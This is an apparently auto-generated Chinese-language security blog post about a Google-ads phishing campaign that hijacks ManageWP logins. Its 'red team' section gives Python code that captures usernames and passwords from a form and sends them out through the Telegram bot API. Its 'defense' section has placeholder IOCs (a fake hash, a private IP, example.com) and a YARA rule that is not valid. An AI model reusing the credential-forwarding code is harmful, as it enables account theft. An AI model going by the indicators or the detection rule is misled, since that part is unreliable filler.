---
layout: post
title:  "Hackers abuse Google ads for GoDaddy ManageWP login phishing"
date:   2026-05-07 02:12:11 +0000
categories: [security]
severity: high
---

# 🔥 解析 Google 廣告釣魚攻擊：ManageWP 登入頁面劫持
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: Credential Theft
> * **關鍵技術**: Adversary-in-the-Middle (AitM), Phishing, Two-Factor Authentication (2FA) Bypass

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Google 廣告平台投放假的 ManageWP 登入頁面，實現 AitM 攻擊。這種攻擊方式使得攻擊者可以在用戶與合法的 ManageWP 服務之間進行實時代理，竊取用戶的登入憑證。
* **攻擊流程圖解**:
  1. 用戶搜索 ManageWP 登入頁面
  2. 攻擊者投放假的登入頁面廣告
  3. 用戶點擊假的登入頁面
  4. 攻擊者實時代理用戶的登入請求
  5. 攻擊者竊取用戶的登入憑證
* **受影響元件**: ManageWP 平台、Google 廣告平台

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Google 廣告帳戶和一個 Telegram 頻道
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 假的登入頁面 URL
    fake_login_url = "https://example.com/fake-login"
    
    # Telegram 頻道 Token
    telegram_token = "YOUR_TELEGRAM_TOKEN"
    
    # 用戶登入請求
    def login_request(username, password):
        # 實時代理用戶的登入請求
        requests.post("https://managewp.com/login", data={"username": username, "password": password})
    
    # Telegram 頻道發送消息
    def send_message(message):
        requests.post(f"https://api.telegram.org/bot{telegram_token}/sendMessage", data={"chat_id": "YOUR_CHAT_ID", "text": message})
    
    # 攻擊者實時代理用戶的登入請求
    def proxy_login_request(request):
        username = request.form["username"]
        password = request.form["password"]
        login_request(username, password)
        send_message(f"Username: {username}, Password: {password}")
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全措施，例如使用代理伺服器或 VPN 來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /fake-login |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ManageWP_Phishing {
        meta:
            description = "Detects ManageWP phishing attacks"
            author = "Your Name"
        strings:
            $fake_login_url = "https://example.com/fake-login"
        condition:
            $fake_login_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 用戶應該在瀏覽器中啟用兩步驗證，並且應該使用安全的密碼管理器來存儲密碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Adversary-in-the-Middle (AitM)**: 想像兩個對話者之間有一個中間人，實時代理和竊取他們的對話內容。技術上是指攻擊者在用戶和服務之間進行實時代理，竊取用戶的登入憑證。
* **Phishing**: 想像一個釣魚者發送假的魚餌給魚，魚一旦咬住魚餌就會被釣魚者捕獲。技術上是指攻擊者發送假的電子郵件或網頁給用戶，竊取用戶的登入憑證。
* **Two-Factor Authentication (2FA)**: 想像一個安全的門，需要兩把鑰匙才能打開。技術上是指用戶需要提供兩種不同的驗證方式，例如密碼和驗證碼，才能登入系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hackers-abuse-google-ads-for-godaddy-managewp-login-phishing/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


